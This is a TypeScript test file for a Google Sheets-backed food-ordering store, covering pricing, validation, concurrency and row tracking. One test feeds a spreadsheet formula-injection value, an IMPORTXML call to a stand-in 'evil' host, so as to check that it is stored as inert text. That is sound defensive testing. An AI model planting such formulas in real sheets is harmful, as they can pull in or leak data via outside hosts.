import { test } from "node:test";
import assert from "node:assert/strict";
import { SheetsMirror } from "./mirror";
import {
  OrderNotFoundError,
  OrderValidationError,
  RowMovedError,
  SheetsStore,
} from "./store";
import { FakeSheets } from "./testing";
import {
  COL,
  MENU_HEADER,
  MODIFIERS_HEADER,
  ORDER_HEADER,
  ROLES_HEADER,
  dayTabName,
  safeText,
  type Cell,
} from "./model";

async function setup(todayRows?: Cell[][]) {
  const sheets = new FakeSheets();
  if (todayRows) sheets.set(dayTabName(), todayRows);
  sheets.set("Menu", [
    MENU_HEADER,
    ["Grilled Cheese", "", 4.5, "Sandwiches", true, true, "", false],
    ["Fries", "", 3, "Sides", true, false, "", false],
    ["Sold Out Wrap", "", 6, "Sandwiches", false, false, "", false],
  ]);
  sheets.set("Modifiers", [MODIFIERS_HEADER, ["Grilled Cheese", "", false, 0, "", "Bacon", 1, true]]);
  sheets.set("Roles", [ROLES_HEADER]);
  const events: string[] = [];
  const mirror = new SheetsMirror(sheets, (type) => events.push(type));
  const store = new SheetsStore(sheets, mirror);
  await mirror.refresh();
  return { sheets, mirror, store, events, today: dayTabName() };
}

const cheese = (extra: object = {}) => ({ menuItemId: "Grilled Cheese", quantity: 2, modifiers: ["Bacon"], ...extra });

test("createOrder makes today's tab, prices from the menu (ignoring client prices), and appends the row", async () => {
  const { sheets, store, events, today } = await setup();
  const order = await store.createOrder({
    netId: "ewb28",
    phone: "555-1234",
    // a client-supplied price must be ignored
    items: [cheese({ price: 0.01 })],
  });

  assert.equal(order.status, "awaiting_payment");
  assert.equal(order.totalPrice, 11); // (4.5 + 1) * 2
  assert.equal(order.orderItems[0].price, 5.5);
  assert.equal(order.orderItems[0].modifiers[0].name, "Bacon");
  assert.equal(order.phone, "555-1234");

  const rows = sheets.rows(today);
  assert.deepEqual(rows[0], ORDER_HEADER);
  assert.equal(rows.length, 2);
  assert.equal(rows[1][COL.order], "2x Grilled Cheese (Bacon)");
  assert.equal(rows[1][COL.paid], false);
  assert.equal(rows[1][COL.orderId], order.id);
  assert.deepEqual(events, ["order:created"]);
});

test("createOrder rejects unknown items, unavailable items, and empty orders", async () => {
  const { store, sheets } = await setup();
  await assert.rejects(store.createOrder({ netId: "a", items: [{ menuItemId: "Nope", quantity: 1 }] }), OrderValidationError);
  await assert.rejects(store.createOrder({ netId: "a", items: [{ menuItemId: "Sold Out Wrap", quantity: 1 }] }), OrderValidationError);
  await assert.rejects(store.createOrder({ netId: "a", items: [] }), OrderValidationError);
  await assert.rejects(store.createOrder({ netId: "", items: [{ menuItemId: "Fries", quantity: 1 }] }), OrderValidationError);
  assert.equal(sheets.writeCalls, 0); // nothing reached the sheet
});

test("10 concurrent orders produce 10 rows, none lost or overwritten", async () => {
  const { sheets, store, today } = await setup();
  const orders = await Promise.all(
    Array.from({ length: 10 }, (_, i) => store.createOrder({ netId: `user${i}`, items: [{ menuItemId: "Fries", quantity: 1 }] }))
  );
  assert.equal(new Set(orders.map((o) => o.id)).size, 10);
  const rows = sheets.rows(today);
  assert.equal(rows.length, 11);
  assert.deepEqual(
    new Set(rows.slice(1).map((r) => r[COL.netId])),
    new Set(Array.from({ length: 10 }, (_, i) => `user${i}`))
  );
});

test("updateOrder maps status to checkboxes and re-finds the row after a worker sorts the sheet", async () => {
  const { sheets, store, mirror, today } = await setup();
  const a = await store.createOrder({ netId: "a", items: [{ menuItemId: "Fries", quantity: 1 }] });
  const b = await store.createOrder({ netId: "b", items: [{ menuItemId: "Fries", quantity: 1 }] });
  assert.equal(mirror.getOrder(a.id)!.row, 2);

  // Worker sorts the sheet between polls: the mirror still thinks a is on row 2.
  const [header, ra, rb] = sheets.rows(today);
  sheets.set(today, [header, rb, ra]);

  const updated = await store.updateOrder(a.id, { status: "ready" });
  assert.equal(updated.status, "ready");
  const rows = sheets.rows(today);
  assert.equal(rows[2][COL.orderId], a.id);
  assert.equal(rows[2][COL.done], true);
  assert.equal(rows[1][COL.done], false); // b untouched
  assert.equal(mirror.getOrder(b.id)!.order.status, "awaiting_payment");
});

test("markPaid sets Paid and the Clover ID, moving the order to pending; completed sets Picked Up", async () => {
  const { sheets, store, today } = await setup();
  const o = await store.createOrder({ netId: "a", items: [{ menuItemId: "Fries", quantity: 1 }] });

  const paid = await store.markPaid(o.id, "CLOVER-XYZ");
  assert.equal(paid.status, "pending");
  assert.equal(sheets.rows(today)[1][COL.paymentId], "CLOVER-XYZ");
  assert.equal(sheets.rows(today)[1][COL.paid], true);

  const done = await store.updateOrder(o.id, { status: "completed" });
  assert.equal(done.status, "completed");
  assert.equal(sheets.rows(today)[1][COL.pickedUp], true);
  assert.equal(sheets.rows(today)[1][COL.paid], true); // status changes never touch Paid
});

test("comments starting with = are stored as text, not evaluated as formulas", async () => {
  const { sheets, store, today } = await setup();
  const o = await store.createOrder({ netId: "a", items: [{ menuItemId: "Fries", quantity: 1 }] });
  await store.updateOrder(o.id, { comments: '=IMPORTXML("http://evil","//x")' });
  assert.equal(sheets.rows(today)[1][COL.comments], `'=IMPORTXML("http://evil","//x")`);
  assert.equal(safeText("no rush"), "no rush");
  assert.equal(safeText("-5 off"), "'-5 off");
});

test("updateOrder on an unknown order rejects with OrderNotFoundError", async () => {
  const { store } = await setup();
  await assert.rejects(store.updateOrder("does-not-exist", { status: "ready" }), OrderNotFoundError);
});

test("a failed write surfaces to the caller and does not wedge the queue", async () => {
  const { sheets, store } = await setup();
  await store.createOrder({ netId: "a", items: [{ menuItemId: "Fries", quantity: 1 }] }); // creates the tab
  sheets.failWrites = { count: 1, error: new Error("boom") };
  await assert.rejects(store.createOrder({ netId: "b", items: [{ menuItemId: "Fries", quantity: 1 }] }), /boom/);
  const ok = await store.createOrder({ netId: "c", items: [{ menuItemId: "Fries", quantity: 1 }] });
  assert.equal(ok.netId, "c");
});

test("hand-typed rows are shown, stamped with a stable ID, and can be marked done", async () => {
  const manualRow: Cell[] = ["Sam", "turkey sandwich", false, false, false, "", ""];
  const { sheets, store, mirror, today } = await setup([ORDER_HEADER, manualRow]); // first refresh sees the row and stamps it in the background
  const seen = mirror.getOrders()[0];
  assert.equal(seen.status, "pending");
  assert.equal(seen.totalPrice, 0);

  await new Promise((r) => setTimeout(r, 50)); // let the background stamp finish
  assert.equal(sheets.rows(today)[1][COL.orderId], `manual:${today}:2`);

  const done = await store.updateOrder(seen.id, { status: "ready" });
  assert.equal(done.status, "ready");
  assert.equal(sheets.rows(today)[1][COL.done], true);
});

test("an unstamped hand-typed row that moved is rejected instead of writing to the wrong row", async () => {
  const manualRow: Cell[] = ["Sam", "turkey sandwich", false, false, false, "", ""];
  const { sheets, store, mirror, today } = await setup([ORDER_HEADER, manualRow]);
  // The row was seen (and a stamp attempted). Undo the stamp to simulate a worker sorting before it landed.
  await new Promise((r) => setTimeout(r, 50));
  sheets.rows(today)[1][COL.orderId] = "";
  const id = mirror.getOrders()[0].id;

  sheets.set(today, [ORDER_HEADER, ["Someone Else", "chips", false, false, false, "", ""], manualRow]);
  await assert.rejects(store.updateOrder(id, { status: "ready" }), RowMovedError);
  assert.equal(sheets.rows(today)[1][COL.done], false); // the wrong row was not touched
});

test("today's tab protects the backend-owned columns for admins + the service account, only when admins are configured", async () => {
  const prevAdmins = process.env.SHEETS_ADMIN_EMAILS;
  const prevSa = process.env.GOOGLE_SHEETS_CLIENT_EMAIL;
  try {
    process.env.SHEETS_ADMIN_EMAILS = "boss@yale.edu, lead@yale.edu";
    process.env.GOOGLE_SHEETS_CLIENT_EMAIL = "bot@proj.iam.gserviceaccount.com";
    const { sheets, store } = await setup();
    await store.createOrder({ netId: "a", items: [{ menuItemId: "Fries", quantity: 1 }] });

    const add = sheets.requestLog.find((r) => r.addSheet)!;
    const protect = sheets.requestLog.find((r) => r.addProtectedRange)!.addProtectedRange!.protectedRange!;
    assert.equal(protect.range!.sheetId, add.addSheet!.properties!.sheetId); // same atomic batch, same new tab
    assert.equal(protect.range!.startColumnIndex, COL.orderId);
    assert.equal(protect.range!.endColumnIndex, COL.cancelled + 1);
    assert.deepEqual(protect.editors!.users, ["boss@yale.edu", "lead@yale.edu", "bot@proj.iam.gserviceaccount.com"]);

    delete process.env.SHEETS_ADMIN_EMAILS;
    const other = await setup();
    await other.store.createOrder({ netId: "a", items: [{ menuItemId: "Fries", quantity: 1 }] });
    assert.equal(other.sheets.requestLog.some((r) => r.addProtectedRange), false);
  } finally {
    if (prevAdmins === undefined) delete process.env.SHEETS_ADMIN_EMAILS; else process.env.SHEETS_ADMIN_EMAILS = prevAdmins;
    if (prevSa === undefined) delete process.env.GOOGLE_SHEETS_CLIENT_EMAIL; else process.env.GOOGLE_SHEETS_CLIENT_EMAIL = prevSa;
  }
});

test("setMenuFlags writes Available/Hot into the item's row and rejects unknown items", async () => {
  const { sheets, store } = await setup();
  const item = await store.setMenuFlags("Fries", { available: false, hot: true });
  assert.equal(item.available, false);
  assert.equal(item.hot, true);
  assert.equal(sheets.rows("Menu")[2][4], false); // Fries is the second data row
  assert.equal(sheets.rows("Menu")[2][5], true);
  assert.equal(sheets.rows("Menu")[1][4], true); // Grilled Cheese untouched
  await assert.rejects(store.setMenuFlags("Nope", { available: false }), /Nope/);
});
